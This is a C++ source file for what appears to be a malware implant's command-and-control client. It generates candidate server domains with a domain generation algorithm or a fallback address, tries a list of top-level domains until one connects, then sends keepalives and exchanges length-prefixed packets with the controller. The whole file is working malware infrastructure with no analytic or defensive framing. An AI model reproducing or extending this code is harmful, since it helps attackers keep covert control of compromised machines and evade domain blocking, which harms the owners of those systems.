#include "c2.h"

std::string C2::get_basedomain()
{
    return dga(dgaseed);
}

bool C2::is_alive()
{
    auto buffer = asio::buffer("1234\n"); //chagne to KEEPALIVE

    try {

        mysocket.send(buffer);
        return true;
    }
    catch (...){
        return false;
    }
}

bool C2::find_and_connect()
{
    asio::error_code ec;
    std::string full_domain;
    std::string basedomain;
    stringvec tlds = topleveldomains;
    asio::ip::tcp::resolver resolver(asio_context);
  
    
    if (fallbackaddr[0] != '\0') {
        basedomain = fallbackaddr;
        tlds.insert(tlds.begin(), ""); // to get a resolve at the first try
    }
    else {
        basedomain = get_basedomain();
    }
    
    LOG("generated base domain: " << basedomain);

    for (auto tld : tlds) {
        full_domain = basedomain + tld;

        asio::ip::tcp::resolver::query query(full_domain, port);
        auto results = resolver.resolve(query, ec);
        
        asio::ip::tcp::endpoint endpoint;

        if (!ec) {
            for (auto res : results) {
                endpoint = res.endpoint();

                LOG("resolved " << full_domain << " to " << endpoint.address().to_string());

                mysocket.connect(endpoint,ec); //TODO: authentication

                if (!ec){ 
                    LOG("sucessfuly connected to c2 at " << endpoint.address().to_string() << ":" << port);
                    goto valid_found;
                }
            }
        }
    }
    return false;

valid_found:
    return true;

}

void C2::send_packet(netpack::Packet& p)
{
    mysocket.send(asio::buffer(p.full()));
}

netpack::Packet C2::recv_packet()
{
    netpack::Packet p(0);
    netpack::bytevec sbuf{ 0,0,0,0 };
    asio::error_code ec;

    mysocket.read_some(asio::buffer(sbuf, 4), ec);
    uint32_t sz = netpack::unpack_size(sbuf.data());

    if (!ec) {
        netpack::bytevec pbuf(sz);

        mysocket.read_some(asio::buffer(pbuf, sz), ec);

        p.from_net(pbuf.data(), sz);
    }

    return p;
}
